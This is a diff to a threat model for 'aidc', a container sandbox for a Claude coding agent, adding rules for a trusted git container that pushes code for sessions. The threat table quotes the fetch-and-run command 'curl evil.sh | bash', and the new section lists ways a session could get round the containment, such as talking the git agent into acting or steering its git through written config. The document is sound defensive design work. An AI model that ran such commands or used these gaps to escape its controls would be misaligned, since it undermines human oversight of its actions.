@@ -15,7 +15,7 @@ What aidc protects against, with mitigations:
 | Threat | Mitigation | Doc |
 |--------|------------|-----|
 | Claude modifies host files outside the mounted repo | Container filesystem isolation: only the repo is bind-mounted read-write; the rest of the container has no host visibility | `design-01-architecture.md` |
-| Claude pushes a malicious commit to GitHub | No SSH keys, no GitHub tokens, no `gh`; optional system pre-push hook as belt-and-suspenders | `design-02-git-isolation.md` |
+| Claude pushes a malicious commit to GitHub | No SSH keys, no GitHub tokens, no GitHub CLI (`gh` is aidc's stand-in); system pre-push hook and a push URL that goes nowhere as belt-and-suspenders. With a git container set up, sessions only *ask* it, and it pushes by fixed rules, in ask mode only after the user approves | `design-02-git-isolation.md`, `design-12-kubernetes.md` ("Git"), below |
 | Claude runs `curl evil.sh \| bash` | Session bridge is a Docker `internal` network — no NAT, so the only route out is dual-homed squid, which blocks known-bad domains (URLhaus, HaGeZi-TIF) + Quad9 DNS upstream + state-actor TLD policy | `design-04-proxy-stack.md`, NET-14 |
 | Claude destroys / spies on host Docker | DinD instead of host socket mount; inner daemon is fully scoped to the outer container | `design-03-docker-isolation.md` |
 | Claude persists malware in a container image | Container is ephemeral — `aidc kill` destroys everything; next `aidc create` starts clean | `design-01-architecture.md`, this doc |
@@ -178,6 +178,32 @@ The rest (`egress: direct`, `networks`, `ports`, `egress_tcp`, `dns_servers`, `a
 softer `taint_response`) is listed by `aidc create` and ignored unless the operator passes
 `--trust-repo-config`. **Mitigation for the operator:** read that list before passing the
 flag; put settings you want in your own `~/.config/aidc/config.yaml`.
+
+### The git container: what a session can ask it to do (K8S-04, K8S-24)
+
+With `aidc git setup` (either backend) one trusted container per user holds the GitHub login and
+pushes and opens PRs for sessions. Sessions still cannot push: they write request files, and the
+container acts on them by gitctl's fixed verbs and rules (fast-forward only, never main, master,
+develop or the default branch, merge commits only, no AI attribution in commits or PR text), in
+ask mode only after the user approves what they were shown (the repo and the exact commit). The
+login is readable only by its credential user; the container's own agent, which reads text
+sessions wrote, runs git with no credential and reaches the login only through gitctl. git never
+runs with the login in a repo anyone else can write: commits cross as bundles into private
+copies. Its network reaches public addresses only. What remains, by design or not yet closed:
+
+- **What a session asks for is code it wrote.** A pushed branch is the session's work; gitctl
+  scans commit messages and authors for attribution, not diffs. Review the PR before merging; in
+  `rules` mode nothing waits for you.
+- **The git agent is not a boundary.** Its allow list and instructions are courtesies; it can run
+  gitctl itself, so a session that talks it into acting gets what gitctl's rules allow, no more.
+  Only its instructions stop it approving a request without asking you.
+- **Session-written config in a working copy** can still steer the agent's own git (code as the
+  agent's uid, or on Docker as the user's uid through `gitwc`), with the container's public-only
+  egress and no login. Filters, hooks and fsmonitor are pinned off where gitctl runs git there.
+- **A session's name in a request is self-reported;** per-session modes are keyed by a token only
+  that session holds, and can only loosen your mode, never tighten it.
+- **Branch protection is GitHub's backstop.** `aidc git protect` offers a ruleset; a fine-grained
+  token without admin scope limits what a mistake can reach.
 
 ### Host network position attacks
 
